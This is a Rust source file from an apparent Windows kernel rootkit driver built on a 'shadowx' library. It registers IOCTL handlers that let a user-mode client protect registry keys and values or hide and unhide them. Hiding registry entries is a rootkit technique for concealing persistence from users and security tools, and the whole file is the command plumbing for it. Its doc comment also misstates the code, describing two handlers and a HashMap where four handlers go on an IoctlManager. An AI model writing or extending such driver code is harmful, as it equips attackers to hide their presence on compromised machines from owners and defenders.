#![cfg(not(feature = "mapper"))]

use {
    wdk_sys::*,
    shadowx::registry::utils::Type,
    alloc::boxed::Box, 
};

use {
    crate::utils::{
        get_input_buffer, 
        ioctls::IoctlManager
    },
    common::{
        structs::TargetRegistry,
        ioctls::{
            HIDE_UNHIDE_KEY, 
            HIDE_UNHIDE_VALUE, 
            REGISTRY_PROTECTION_KEY, 
            REGISTRY_PROTECTION_VALUE
        },
    }, 
};

/// Registers the IOCTL handlers for registry-related operations.
///
/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
/// their respective IOCTL codes. The two operations supported are:
///
/// # Arguments
/// 
/// * `ioctls` - A mutable reference to a `HashMap<u32, IoctlHandler>` where the registry-related
///   IOCTL handlers will be inserted.
pub fn register_registry_ioctls(ioctls: &mut IoctlManager) {
    // Adding protection for registry key values.
    ioctls.register_handler(REGISTRY_PROTECTION_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        unsafe {
            let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
            let status = shadowx::Registry::modify_key_value(target_registry, Type::Protect);

            (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
            Ok(status)
        }
    }));
    
    // Added protection for registry keys.
    ioctls.register_handler(REGISTRY_PROTECTION_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        unsafe {
            let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
            let status = shadowx::Registry::modify_key(target_registry, Type::Protect);

            (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
            Ok(status)
        }
    }));

    // Handles IOCTL to hide or unhide a registry key.
    ioctls.register_handler(HIDE_UNHIDE_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        unsafe {
            let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
            let status = shadowx::Registry::modify_key(target_registry, Type::Hide);

            (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
            Ok(status)
        }
    }));

    // Handles IOCTL to hide or unhide a registry value.
    ioctls.register_handler(HIDE_UNHIDE_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        unsafe {
            let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
            let status = shadowx::Registry::modify_key_value(target_registry, Type::Hide);

            (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
            Ok(status)
        }
    }));
}